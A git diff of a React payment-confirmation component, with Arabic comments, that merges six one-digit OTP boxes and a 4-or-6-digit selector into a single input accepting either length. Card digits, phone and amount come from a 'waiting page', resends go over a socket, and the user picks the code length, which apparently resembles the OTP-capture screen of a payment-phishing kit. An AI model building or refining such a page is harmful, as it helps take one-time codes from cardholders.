@@ -10,8 +10,7 @@ export default function PaymentOTP() {
   // البيانات القادمة من صفحة الانتظار
   const { cardLastDigits, phoneNumber, amount } = location.state || {};
   
-  const [otpLength, setOtpLength] = useState(6); // 4 or 6
-  const [otp, setOtp] = useState(Array(6).fill(''));
+  const [otpCode, setOtpCode] = useState('');
   const [timeLeft, setTimeLeft] = useState(120); // 2 minutes
   const [isVerifying, setIsVerifying] = useState(false);
   const [error, setError] = useState('');
@@ -40,54 +39,14 @@ export default function PaymentOTP() {
     return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
-  // تغيير طول OTP
-  const handleOtpLengthChange = (length) => {
-    setOtpLength(length);
-    setOtp(Array(length).fill(''));
-    setError('');
-  };
-
   // التعامل مع إدخال OTP
-  const handleOtpChange = (index, value) => {
-    // السماح بالأرقام فقط
-    if (!/^\d*$/.test(value)) return;
-
-    const newOtp = [...otp];
-    newOtp[index] = value;
-    setOtp(newOtp);
+  const handleOtpChange = (e) => {
+    const value = e.target.value;
+    // السماح بالأرقام فقط وحد أقصى 6 أرقام
+    if (!/^\d*$/.test(value) || value.length > 6) return;
+    
+    setOtpCode(value);
     setError('');
-
-    // الانتقال للحقل التالي تلقائياً
-    if (value && index < otpLength - 1) {
-      const nextInput = document.getElementById(`otp-${index + 1}`);
-      if (nextInput) nextInput.focus();
-    }
-  };
-
-  // التعامل مع الحذف
-  const handleKeyDown = (index, e) => {
-    if (e.key === 'Backspace' && !otp[index] && index > 0) {
-      const prevInput = document.getElementById(`otp-${index - 1}`);
-      if (prevInput) prevInput.focus();
-    }
-  };
-
-  // التعامل مع اللصق
-  const handlePaste = (e) => {
-    e.preventDefault();
-    const pastedData = e.clipboardData.getData('text').slice(0, otpLength);
-    if (!/^\d+$/.test(pastedData)) return;
-
-    const newOtp = Array(otpLength).fill('');
-    for (let i = 0; i < pastedData.length && i < otpLength; i++) {
-      newOtp[i] = pastedData[i];
-    }
-    setOtp(newOtp);
-
-    // التركيز على آخر حقل تم ملؤه
-    const lastFilledIndex = Math.min(pastedData.length, otpLength - 1);
-    const lastInput = document.getElementById(`otp-${lastFilledIndex}`);
-    if (lastInput) lastInput.focus();
   };
 
   // إعادة إرسال الرمز
@@ -96,7 +55,7 @@ export default function PaymentOTP() {
     
     setTimeLeft(120);
     setCanResend(false);
-    setOtp(Array(otpLength).fill(''));
+    setOtpCode('');
     setError('');
     
     if (socket) {
@@ -109,10 +68,9 @@ export default function PaymentOTP() {
 
   // التحقق من الرمز
   const handleVerifyOtp = async () => {
-    const otpCode = otp.join('');
-    
-    if (otpCode.length !== otpLength) {
-      setError(`يرجى إدخال الرمز المكون من ${otpLength} أرقام`);
+    // يجب أن يكون 4 أو 6 أرقام فقط
+    if (otpCode.length !== 4 && otpCode.length !== 6) {
+      setError('يرجى إدخال رمز مكون من 4 أو 6 أرقام فقط');
       return;
     }
 
@@ -163,33 +121,9 @@ export default function PaymentOTP() {
         <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">
           تأكيد عملية الدفع
         </h1>
-        <p className="text-center text-gray-600 mb-4">
-          أدخل رمز التحقق المكون من {otpLength} أرقام
+        <p className="text-center text-gray-600 mb-6">
+          أدخل رمز التحقق (4 أو 6 أرقام)
         </p>
-
-        {/* اختيار طول OTP */}
-        <div className="flex justify-center gap-4 mb-6">
-          <button
-            onClick={() => handleOtpLengthChange(4)}
-            className={`px-6 py-2 rounded-lg font-semibold transition-all ${
-              otpLength === 4
-                ? 'bg-blue-600 text-white shadow-lg'
-                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
-            }`}
-          >
-            4 أرقام
-          </button>
-          <button
-            onClick={() => handleOtpLengthChange(6)}
-            className={`px-6 py-2 rounded-lg font-semibold transition-all ${
-              otpLength === 6
-                ? 'bg-blue-600 text-white shadow-lg'
-                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
-            }`}
-          >
-            6 أرقام
-          </button>
-        </div>
 
         {/* معلومات البطاقة والهاتف */}
         <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm">
@@ -213,25 +147,26 @@ export default function PaymentOTP() {
 
         {/* حقول إدخال OTP */}
         <div className="mb-6">
-          <div className="flex justify-center gap-2 mb-4" dir="ltr">
-            {otp.slice(0, otpLength).map((digit, index) => (
-              <input
-                key={index}
-                id={`otp-${index}`}
-                type="text"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleOtpChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onPaste={index === 0 ? handlePaste : undefined}
-                className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all ${
-                  error ? 'border-red-500' : 'border-gray-300'
-                }`}
-                dir="ltr"
-              />
-            ))}
-          </div>
+          <label htmlFor="otp-input" className="block text-sm font-semibold text-gray-700 mb-2 text-center">
+            رمز التحقق (4 أو 6 أرقام)
+          </label>
+          <input
+            id="otp-input"
+            type="text"
+            inputMode="numeric"
+            maxLength={6}
+            value={otpCode}
+            onChange={handleOtpChange}
+            placeholder="أدخل الرمز"
+            className={`w-full h-16 text-center text-3xl font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all tracking-widest ${
+              error ? 'border-red-500' : 'border-gray-300'
+            }`}
+            dir="ltr"
+            autoComplete="off"
+          />
+          <p className="text-center text-xs text-gray-500 mt-2">
+            {otpCode.length} / 6 أرقام
+          </p>
 
           {/* رسالة الخطأ */}
           {error && (
@@ -266,7 +201,7 @@ export default function PaymentOTP() {
         {/* زر التحقق */}
         <button
           onClick={handleVerifyOtp}
-          disabled={isVerifying || otp.join('').length !== otpLength}
+          disabled={isVerifying || (otpCode.length !== 4 && otpCode.length !== 6)}
           className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors mb-4"
         >
           {isVerifying ? (
